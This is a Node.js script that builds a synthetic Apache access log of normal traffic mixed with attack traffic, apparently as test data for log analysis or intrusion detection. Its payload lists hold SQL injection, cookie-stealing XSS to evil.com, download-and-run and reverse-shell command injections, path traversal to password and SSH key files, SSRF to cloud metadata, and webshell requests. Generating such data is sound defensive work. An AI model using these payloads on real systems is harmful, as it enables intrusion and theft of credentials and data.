// 生成测试用的 Web 访问日志
// 包含：正常流量 + 多种攻击类型 + 各种 HTTP 方法 + 状态码 + 时间分布

const fs = require('fs')
const path = require('path')

// ========== 配置 ==========
const TOTAL_LINES = 8000
const OUTPUT_FILE = path.join(__dirname, '..', 'test-access.log')

// ========== IP 池 ==========
const PUBLIC_IPS = [
  // 美国
  '203.0.113.10', '198.51.100.23', '192.0.2.45', '203.0.113.67',
  '198.51.100.89', '192.0.2.134', '203.0.113.200', '198.51.100.156',
  // 中国
  '114.114.114.55', '223.5.5.100', '119.29.29.78', '182.254.116.200',
  '101.226.103.55', '180.153.232.100', '116.211.169.90', '123.125.71.88',
  // 俄罗斯
  '95.213.0.45', '178.62.100.200', '5.188.210.222', '37.140.192.100',
  // 德国
  '88.99.100.200', '5.9.100.250', '136.243.100.55', '148.251.100.200',
  // 巴西
  '200.98.100.50', '177.71.100.200', '189.1.100.55', '201.17.100.200',
  // 印度
  '103.21.100.55', '49.207.100.200', '182.71.100.55', '117.199.100.200',
  // 日本
  '126.72.100.55', '163.49.100.200', '210.171.100.55', '103.5.100.200',
  // 英国
  '185.100.55.200', '81.2.100.55', '51.15.100.200', '178.62.100.55',
  // 韩国
  '121.254.100.55', '175.210.100.200', '1.234.100.55', '112.175.100.200',
]

const ATTACKER_IPS = [
  '95.213.0.45', '178.62.100.200', '5.188.210.222', '37.140.192.100',
  '88.99.100.200', '5.9.100.250', '200.98.100.50', '177.71.100.200',
  '103.21.100.55', '49.207.100.200', '126.72.100.55', '163.49.100.200',
]

const SCANNER_IPS = [
  '95.213.0.45', '5.188.210.222', '88.99.100.200', '200.98.100.50',
]

// ========== URL 路径池 ==========
const NORMAL_PATHS = [
  '/', '/index.html', '/about', '/contact', '/products', '/api/v1/users',
  '/api/v1/products', '/api/v1/orders', '/api/v1/categories', '/api/v1/search',
  '/api/v2/users', '/api/v2/products', '/api/v2/orders', '/api/v2/analytics',
  '/static/css/main.css', '/static/js/app.js', '/static/js/vendor.js',
  '/static/images/logo.png', '/static/images/banner.jpg',
  '/favicon.ico', '/robots.txt', '/sitemap.xml',
  '/login', '/register', '/logout', '/profile', '/dashboard',
  '/admin/login', '/admin/dashboard', '/admin/users', '/admin/settings',
  '/blog', '/blog/post-1', '/blog/post-2', '/blog/post-3',
  '/docs', '/docs/getting-started', '/docs/api-reference',
  '/health', '/status', '/metrics',
  '/download/report.pdf', '/download/whitepaper.pdf',
  '/upload', '/feedback', '/newsletter/subscribe',
  '/cart', '/checkout', '/payment', '/order/confirmation',
  '/user/12345', '/user/67890', '/user/profile',
  '/api/auth/login', '/api/auth/register', '/api/auth/refresh',
  '/api/data/export', '/api/data/import', '/api/reports/generate',
]

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
  'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
  'PostmanRuntime/7.35.0',
  'python-requests/2.31.0',
  'curl/8.4.0',
]

const BOT_USER_AGENTS = [
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
  'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
  'MJ12bot/v1.4.8 (http://majestic12.co.uk/bot.php?+)',
  'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
  'Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)',
  'Nikto/2.1.6',
  'sqlmap/1.7.10',
  'ZmEu',
  'w3af.org',
]

// ========== 攻击 Payload ==========
const SQL_INJECTION_PATHS = [
  "/api/users?id=1' UNION SELECT username,password FROM users--",
  "/api/products?search=' OR '1'='1",
  "/api/orders?id=1; DROP TABLE orders--",
  "/login?username=admin'--&password=x",
  "/api/search?q=' UNION ALL SELECT NULL,NULL,@@version--",
  "/api/users?id=1' AND 1=1--",
  "/api/products?id=1' WAITFOR DELAY '0:0:5'--",
  "/api/users?id=1' OR SLEEP(5)--",
  "/api/data?id=1; EXEC xp_cmdshell('whoami')",
  "/api/users?id=1' UNION SELECT 1,2,3,4,5--",
  "/api/orders?id=1' AND (SELECT COUNT(*) FROM users)>0--",
  "/api/search?q=admin' OR '1'='1' /*",
  "/api/users?id=1'; INSERT INTO users VALUES('hacked','pass')--",
  "/api/products?id=-1 UNION SELECT table_name FROM information_schema.tables--",
  "/api/users?id=1' OR 1=1#",
  "/api/orders?id=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
  "/login?username=admin' OR '1'='1&password=admin' OR '1'='1",
  "/api/users?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'",
  "/api/data?id=1; SELECT * FROM pg_catalog.pg_sleep(5)--",
  "/api/users?id=1' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users--",
]

const XSS_PAYLOADS = [
  "/search?q=<script>alert('XSS')</script>",
  "/profile?name=<img src=x onerror=alert(1)>",
  "/comment?text=<svg onload=alert(document.cookie)>",
  "/api/input?data=<script>document.location='http://evil.com/?c='+document.cookie</script>",
  "/search?q=javascript:alert(1)",
  "/page?title=<iframe src='http://evil.com'></iframe>",
  "/api/feedback?msg=<body onload=alert('XSS')>",
  "/search?q=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
  "/profile?bio=<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
  "/comment?content=<svg/onload=alert(String.fromCharCode(88,83,83))>",
  "/search?q=<marquee onstart=alert(1)>",
  "/api/data?input=<details open ontoggle=alert(1)>",
  "/page?id=<script>new Image().src='http://evil.com/?d='+document.domain</script>",
  "/search?q=<input onfocus=alert(1) autofocus>",
  "/api/comment?text=<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>",
]

const COMMAND_INJECTION_PATHS = [
  "/api/ping?host=127.0.0.1; cat /etc/passwd",
  "/api/exec?cmd=ls -la /",
  "/api/system?command=whoami",
  "/api/tools?input=test; rm -rf /",
  "/api/pipeline?data=test | cat /etc/shadow",
  "/api/shell?cmd=`id`",
  "/api/process?name=test && wget http://evil.com/malware.sh",
  "/api/backup?file=test; curl http://evil.com/shell.php -o /tmp/s.sh",
  "/api/ping?host=127.0.0.1 | nc -e /bin/sh 10.0.0.1 4444",
  "/api/exec?cmd=test; powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com\")'",
  "/api/system?input=test $(cat /etc/passwd)",
  "/api/tools?cmd=test; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
]

const DIRECTORY_TRAVERSAL_PATHS = [
  "/api/file?name=../../../../etc/passwd",
  "/api/download?path=../../../etc/shadow",
  "/api/config?file=....//....//....//etc/passwd",
  "/api/resource?path=..%2F..%2F..%2Fetc%2Fpasswd",
  "/api/file?name=..\\..\\..\\windows\\system32\\config\\sam",
  "/api/download?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "/api/file?name=../../../../proc/self/environ",
  "/api/log?file=../../../var/log/apache2/access.log",
  "/api/data?path=../../../../home/user/.ssh/id_rsa",
  "/api/file?name=..%252f..%252f..%252fetc%252fpasswd",
  "/api/download?file=../../../../windows/win.ini",
  "/api/config?path=../../../opt/lampp/etc/httpd.conf",
]

const BRUTE_FORCE_PATHS = [
  '/login', '/login', '/login', '/login', '/login',
  '/admin/login', '/admin/login', '/admin/login',
  '/api/auth/login', '/api/auth/login', '/api/auth/login',
  '/wp-login.php', '/wp-login.php',
  '/phpmyadmin/index.php', '/phpmyadmin/index.php',
]

const SCANNER_PATHS = [
  '/admin', '/administrator', '/wp-admin', '/wp-login.php',
  '/phpmyadmin', '/phpmyadmin/index.php', '/pma',
  '/manager', '/console', '/jmx-console',
  '/.env', '/.git/config', '/.git/HEAD',
  '/config.php', '/config.yml', '/config.json', '/config.bak',
  '/backup.zip', '/backup.sql', '/database.sql',
  '/server-status', '/server-info',
  '/robots.txt', '/sitemap.xml',
  '/wp-content/debug.log', '/wp-includes/',
  '/cgi-bin/test.cgi', '/scripts/setup.php',
  '/test.php', '/info.php', '/phpinfo.php',
  '/actuator', '/actuator/health', '/actuator/env',
  '/api/swagger.json', '/api-docs', '/swagger-ui.html',
  '/.well-known/security.txt',
  '/apple-app-site-association', '/assetlinks.json',
  '/telescope', '/horizon', '/_ignition/execute-solution',
  '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
]

const FILE_INCLUSION_PATHS = [
  "/api/page?file=php://input",
  "/api/template?name=php://filter/convert.base64-encode/resource=config.php",
  "/api/module?path=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
  "/api/include?file=http://evil.com/shell.txt",
  "/api/load?path=expect://id",
  "/api/page?file=zip://shell.jpg%23shell.php",
  "/api/template?file=phar://archive.phar/shell.php",
  "/api/module?name=/etc/passwd%00",
]

const SSRF_PATHS = [
  "/api/fetch?url=http://169.254.169.254/latest/meta-data/",
  "/api/proxy?target=http://127.0.0.1:6379/",
  "/api/redirect?dest=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "/api/webhook?endpoint=http://192.168.1.1/admin",
  "/api/load?url=http://localhost:9200/_cat/indices",
  "/api/fetch?url=file:///etc/passwd",
  "/api/proxy?url=http://169.254.169.254/computeMetadata/v1/",
  "/api/redirect?url=http://internal-service:8080/admin",
  "/api/fetch?url=gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E%22",
]

const FILE_UPLOAD_PATHS = [
  '/api/upload (multipart: filename="shell.php")',
  '/api/upload (multipart: filename="test.php.jpg")',
  '/api/upload (multipart: filename="image.php.png")',
  '/api/import (multipart: filename="data.csv.php")',
  '/api/avatar (multipart: filename="cmd.jsp")',
  '/api/document (multipart: filename="payload.asp")',
  '/api/attachment (multipart: filename="webshell.aspx")',
  '/api/file (multipart: filename="backdoor.phtml")',
]

// ========== 工具函数 ==========
function randomChoice(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

function formatTime(date) {
  const pad = (n) => String(n).padStart(2, '0')
  return `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`
}

function formatApacheTime(date) {
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']
  const pad = (n) => String(n).padStart(2, '0')
  return `${pad(date.getDate())}/${months[date.getMonth()]}/${date.getFullYear()}:${formatTime(date)} +0800`
}

function makeApacheLine(ip, time, method, path, status, size, referer, ua) {
  return `${ip} - - [${formatApacheTime(time)}] "${method} ${path} HTTP/1.1" ${status} ${size} "${referer}" "${ua}"`
}

// ========== 生成各类日志行 ==========
const lines = []
const baseDate = new Date('2026-04-29T00:00:00+08:00')

// --- 正常流量 (50%) ---
for (let i = 0; i < TOTAL_LINES * 0.5; i++) {
  const ip = randomChoice(PUBLIC_IPS)
  const time = new Date(baseDate.getTime() + randomInt(0, 24 * 3600 * 1000))
  const method = randomChoice(['GET','GET','GET','GET','GET','POST','POST','PUT','DELETE','HEAD','OPTIONS'])
  const path = randomChoice(NORMAL_PATHS)
  const status = randomChoice([200,200,200,200,200,200,200,301,302,304,400,403,404,404,500])
  const size = randomInt(200, 50000)
  const ua = randomChoice(USER_AGENTS)
  const referer = randomChoice(['-', 'https://www.google.com/', 'https://www.bing.com/', 'https://github.com/', '-'])
  lines.push(makeApacheLine(ip, time, method, path, status, size, referer, ua))
}

// --- SQL 注入 (8%) ---
for (let i = 0; i < TOTAL_LINES * 0.08; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(8 * 3600 * 1000, 20 * 3600 * 1000))
  const path = randomChoice(SQL_INJECTION_PATHS)
  const ua = randomChoice(['sqlmap/1.7.10', 'python-requests/2.31.0', ...USER_AGENTS.slice(0, 3)])
  lines.push(makeApacheLine(ip, time, 'GET', path, randomChoice([200, 400, 403, 500]), randomInt(50, 5000), '-', ua))
}

// --- XSS 攻击 (5%) ---
for (let i = 0; i < TOTAL_LINES * 0.05; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(8 * 3600 * 1000, 20 * 3600 * 1000))
  const path = randomChoice(XSS_PAYLOADS)
  const ua = randomChoice(USER_AGENTS.slice(0, 5))
  lines.push(makeApacheLine(ip, time, 'GET', path, randomChoice([200, 400, 403]), randomInt(100, 3000), '-', ua))
}

// --- 命令注入 (4%) ---
for (let i = 0; i < TOTAL_LINES * 0.04; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(10 * 3600 * 1000, 18 * 3600 * 1000))
  const path = randomChoice(COMMAND_INJECTION_PATHS)
  const ua = randomChoice(['curl/8.4.0', 'python-requests/2.31.0', ...USER_AGENTS.slice(0, 2)])
  lines.push(makeApacheLine(ip, time, 'GET', path, randomChoice([200, 400, 403, 500]), randomInt(50, 2000), '-', ua))
}

// --- 目录遍历 (3%) ---
for (let i = 0; i < TOTAL_LINES * 0.03; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(6 * 3600 * 1000, 22 * 3600 * 1000))
  const path = randomChoice(DIRECTORY_TRAVERSAL_PATHS)
  const ua = randomChoice(USER_AGENTS.slice(0, 4))
  lines.push(makeApacheLine(ip, time, 'GET', path, randomChoice([200, 400, 403, 404]), randomInt(100, 10000), '-', ua))
}

// --- 暴力破解 (6%) ---
for (let i = 0; i < TOTAL_LINES * 0.06; i++) {
  const ip = randomChoice(ATTACKER_IPS.slice(0, 4))
  const time = new Date(baseDate.getTime() + randomInt(0, 6 * 3600 * 1000))
  const path = randomChoice(BRUTE_FORCE_PATHS)
  const ua = randomChoice(['python-requests/2.31.0', 'curl/8.4.0', 'Hydra/9.1'])
  lines.push(makeApacheLine(ip, time, 'POST', path, randomChoice([200, 401, 403, 429]), randomInt(50, 1000), '-', ua))
}

// --- 扫描探测 (8%) ---
for (let i = 0; i < TOTAL_LINES * 0.08; i++) {
  const ip = randomChoice(SCANNER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(0, 24 * 3600 * 1000))
  const path = randomChoice(SCANNER_PATHS)
  const ua = randomChoice(BOT_USER_AGENTS)
  lines.push(makeApacheLine(ip, time, randomChoice(['GET','HEAD']), path, randomChoice([200, 301, 403, 404]), randomInt(10, 5000), '-', ua))
}

// --- CSRF (2%) ---
for (let i = 0; i < TOTAL_LINES * 0.02; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(10 * 3600 * 1000, 16 * 3600 * 1000))
  const csrfPaths = [
    '/api/account/transfer?csrf_token=fake_token_123&amount=10000&to=attacker',
    '/api/password/change?csrf_token=x&_token=invalid&new_password=hacked',
    '/api/settings/email?authenticity_token=forged&email=attacker@evil.com',
    '/logout?csrf_token=stolen_token',
    '/api/admin/delete?_token=none&id=1',
  ]
  const ua = randomChoice(USER_AGENTS.slice(0, 5))
  lines.push(makeApacheLine(ip, time, 'POST', randomChoice(csrfPaths), randomChoice([200, 403, 401]), randomInt(50, 500), 'https://evil-site.com/', ua))
}

// --- 文件包含 (2%) ---
for (let i = 0; i < TOTAL_LINES * 0.02; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(12 * 3600 * 1000, 18 * 3600 * 1000))
  const path = randomChoice(FILE_INCLUSION_PATHS)
  const ua = randomChoice(USER_AGENTS.slice(0, 3))
  lines.push(makeApacheLine(ip, time, 'GET', path, randomChoice([200, 400, 403, 500]), randomInt(100, 5000), '-', ua))
}

// --- SSRF (2%) ---
for (let i = 0; i < TOTAL_LINES * 0.02; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(14 * 3600 * 1000, 20 * 3600 * 1000))
  const path = randomChoice(SSRF_PATHS)
  const ua = randomChoice(['python-requests/2.31.0', 'curl/8.4.0', ...USER_AGENTS.slice(0, 2)])
  lines.push(makeApacheLine(ip, time, 'GET', path, randomChoice([200, 400, 403, 500]), randomInt(100, 10000), '-', ua))
}

// --- 文件上传 (2%) ---
for (let i = 0; i < TOTAL_LINES * 0.02; i++) {
  const ip = randomChoice(ATTACKER_IPS)
  const time = new Date(baseDate.getTime() + randomInt(10 * 3600 * 1000, 16 * 3600 * 1000))
  const path = randomChoice(FILE_UPLOAD_PATHS)
  const ua = randomChoice(USER_AGENTS.slice(0, 4))
  lines.push(makeApacheLine(ip, time, 'POST', '/api/upload', randomChoice([200, 400, 403, 413, 500]), randomInt(100, 50000), '-', ua))
}

// --- WebShell 访问 (1%) ---
for (let i = 0; i < TOTAL_LINES * 0.01; i++) {
  const ip = randomChoice(ATTACKER_IPS.slice(0, 4))
  const time = new Date(baseDate.getTime() + randomInt(20 * 3600 * 1000, 24 * 3600 * 1000))
  const shellPaths = [
    '/uploads/shell.php?cmd=whoami',
    '/images/cmd.php?c=id',
    '/tmp/backdoor.php?exec=cat /etc/passwd',
    '/uploads/test.php.jpg?cmd=ls -la',
    '/data/cache/shell.phtml?c=uname -a',
    '/wp-content/uploads/shell.asp?cmd=net user',
  ]
  const ua = randomChoice(['curl/8.4.0', 'python-requests/2.31.0', 'Go-http-client/1.1'])
  lines.push(makeApacheLine(ip, time, 'GET', randomChoice(shellPaths), randomChoice([200, 403, 404]), randomInt(50, 5000), '-', ua))
}

// --- WebShell 访问 (1%) ---
for (let i = 0; i < TOTAL_LINES * 0.01; i++) {
  const ip = randomChoice(ATTACKER_IPS.slice(0, 4))
  const time = new Date(baseDate.getTime() + randomInt(20 * 3600 * 1000, 24 * 3600 * 1000))
  const shellPaths = [
    '/uploads/shell.php?cmd=whoami',
    '/images/cmd.php?c=id',
    '/tmp/backdoor.php?exec=cat /etc/passwd',
    '/uploads/test.php.jpg?cmd=ls -la',
    '/data/cache/shell.phtml?c=uname -a',
    '/wp-content/uploads/shell.asp?cmd=net user',
  ]
  const ua = randomChoice(['curl/8.4.0', 'python-requests/2.31.0', 'Go-http-client/1.1'])
  lines.push(makeApacheLine(ip, time, 'GET', randomChoice(shellPaths), randomChoice([200, 403, 404]), randomInt(50, 5000), '-', ua))
}

// --- 爬虫流量 (3%) ---
for (let i = 0; i < TOTAL_LINES * 0.03; i++) {
  const ip = randomChoice(PUBLIC_IPS.slice(0, 10))
  const time = new Date(baseDate.getTime() + randomInt(0, 24 * 3600 * 1000))
  const ua = randomChoice(BOT_USER_AGENTS.slice(0, 8))
  const path = randomChoice(NORMAL_PATHS)
  lines.push(makeApacheLine(ip, time, randomChoice(['GET','HEAD']), path, randomChoice([200, 301, 304, 404]), randomInt(100, 20000), '-', ua))
}

// ========== 按时间排序 ==========
lines.sort((a, b) => {
  const timeA = a.match(/\d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}/)?.[0] || ''
  const timeB = b.match(/\d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}/)?.[0] || ''
  return timeA.localeCompare(timeB)
})

// ========== 输出 ==========
fs.writeFileSync(OUTPUT_FILE, lines.join('\n'), 'utf-8')
console.log(`已生成测试日志: ${OUTPUT_FILE}`)
console.log(`总行数: ${lines.length}`)

// 统计
const stats = {}
for (const line of lines) {
  const statusMatch = line.match(/" (\d{3}) /)
  if (statusMatch) {
    const s = statusMatch[1]
    stats[s] = (stats[s] || 0) + 1
  }
}
console.log('\n状态码分布:')
for (const [code, count] of Object.entries(stats).sort((a,b) => b[1] - a[1])) {
  console.log(`  ${code}: ${count}`)
}

const size = fs.statSync(OUTPUT_FILE).size
console.log(`\n文件大小: ${(size / 1024).toFixed(1)} KB`)
